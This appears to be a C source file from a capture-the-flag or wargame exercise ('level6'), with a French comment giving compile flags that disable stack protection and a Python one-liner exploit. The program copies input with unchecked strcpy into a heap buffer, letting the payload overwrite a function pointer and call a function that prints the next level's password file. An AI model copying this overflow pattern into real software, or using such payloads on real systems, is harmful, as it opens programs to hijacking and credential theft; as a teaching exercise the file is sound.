/*
	Pour compiler le .c:
	gcc -m32 -fno-stack-protector source.c -o level6

	Ensuite:
	./level6 $(python -c 'print "A"*80+"\xc0\x84\x04\x08"')
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void	n(void)
{
	system("/bin/cat /home/user/level7/.pass");
}

void	m(void)
{
	puts("Nope");
}

typedef void (*f_ptr)(void);

int 	main(int ac, char **av)
{
	char	*str1;
	void	*str2;
	f_ptr	f;

	str1 = (char*)malloc(64);
	str2 = malloc(4);
	*((unsigned long *)str2) = (unsigned long)m;
	strcpy(str1, av[1]);
	f = *((f_ptr*)str2);
	f();
}
